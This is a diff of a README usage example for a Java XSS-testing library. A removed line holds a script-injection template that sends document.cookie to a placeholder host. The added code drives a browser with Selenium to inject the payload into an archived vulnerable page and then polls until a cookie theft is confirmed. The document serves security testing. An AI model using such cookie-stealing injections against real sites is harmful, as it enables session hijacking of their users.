@@ -15,38 +15,58 @@ In order to do ethicial XSS testing you require simple http server running on th
 
 ##Usage example
 ```java
-XSSCheck x=XSSVerifier.createNewCheck(4567,"xss.gif","<script> img = new Image(); img.src = \"http://%1$s:%2$d/%3$s?\"+document.cookie; </script>");
-/* 4567 is a port number where the XSS checker's embbedded http server runs, xss.gif is a resource, the last string is  javascript injection template*/
 
-//check occurs behind the scene
-//to ensure it works open localhost:4567/xss.gif in your browser
+        WebDriver driver = new FirefoxDriver();
 
-while (!x.getXSSURLCalledStatus())
-{
-    Thread.sleep(1000);
-    System.out.println("wait 1...");
-}
+        // Going to some XSS-having website saved on the web archive
+        driver.get("https://web.archive.org/web/20060819041322/http://tarcima.narod.ru/otherencoding.htm");
+        // Alternatively the same thing can be done like this
+        // driver.navigate().to("http://www.google.com");
+
+        WebElement textarea=driver.findElement(By.xpath("//textarea"));
+        WebElement button=driver.findElement(By.xpath("//input[@type='button']"));
+
+        LimitedRandomImageResourceGenerator tg=new LimitedRandomImageResourceGenerator();
+        tg.setStringLength(3);
+        tg.setFileLocation("bug.jpg");
+        tg.setExt("jpg");
+        XSSCheck x= XSSVerifier.createNewCheck(4567, XSSTypes.JAVSCRIPT_IMG_TAG.toString(), tg);
+/* 4567 is a port number where the XSS checker's embbedded http server runs,  resource generator creates random resource + specified extention and define what should be returned by the server when the XSS succeed*/
+
+        textarea.sendKeys(x.getXSS());
+        button.click();
+//the WebDriver opens the browser and inserts the injection to the textearea; then the page is transformed to the injected one and the XSS calls the XSS sniffer right in the WebDriver-driven browser
 
 //the XSS host and resource were requested but not nessessarily some parameter was passed
 //to ensure it works open localhost:4567/xss.gif?sometext in your browser
 
-while (!x.getXSSCookiePassedStatus())
-{
-    Thread.sleep(1000);
-    System.out.println("wait 2...");
-}
-
+        while (!x.getXSSURLCalledStatus())
+        {
+            Thread.sleep(1000);
+        }
+        
 //the XSS host and resource were requested and some parameter was passed but that was not the hijacked cookie
 //to ensure it works open localhost:4567/xss.gif?visited=02022015 in your browser
 
-while (!x.getXSSCookieHijacked("visited"))
-{
-    Thread.sleep(1000);
-    System.out.println("wait 3...");
-}
+        while (!x.getXSSCookiePassedStatus())
+        {
+            Thread.sleep(1000);
+        }
 
 //the XSS host and resource were requested, some parameter was passed and this parameter is cookie named visited
 //so the particular cookie was hijacked and that was verified
+
+        while (!x.getXSSCookieHijacked("visited"))
+        {
+            Thread.sleep(1000);
+        }
+
+//the cookie never set by the website will be never requested
+        while (!x.getXSSCookieHijacked("visited2"))
+        {
+            Thread.sleep(1000);
+        }
+
 ```
 
 ##Notes
